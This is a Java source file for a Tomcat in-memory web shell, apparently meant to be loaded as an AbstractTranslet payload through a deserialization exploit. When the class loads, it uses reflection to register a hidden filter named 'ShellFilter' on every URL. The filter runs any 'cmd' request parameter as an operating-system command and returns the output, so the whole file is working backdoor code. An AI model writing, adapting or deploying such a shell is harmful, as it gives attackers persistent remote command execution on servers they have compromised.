package Tomcat_Echo_memShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;

public class Tomcat_Echo_inject_Filter extends AbstractTranslet implements Filter {

    static {
        try {
            ServletContext servletContext = getServletContext();
            java.lang.reflect.Field appContextField = servletContext.getClass().getDeclaredField("context");
            appContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            standardContextField.setAccessible(true);
            StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);


            Tomcat_Echo_inject_Filter filter = new Tomcat_Echo_inject_Filter();
            String name = "ShellFilter";
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(filterDef);


            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);


            java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);

            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            filterConfigs.put(name, filterConfig);

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }


    public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        lastServicedRequestField.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
        if(threadLocal!=null && threadLocal.get()!=null){
            ServletRequest servletRequest = (ServletRequest) threadLocal.get();
            return servletRequest.getServletContext();
        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter writer = response.getWriter();
        if (cmd != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();

                //将命令执行结果写入扫描器并读取所有输入
                java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }
}
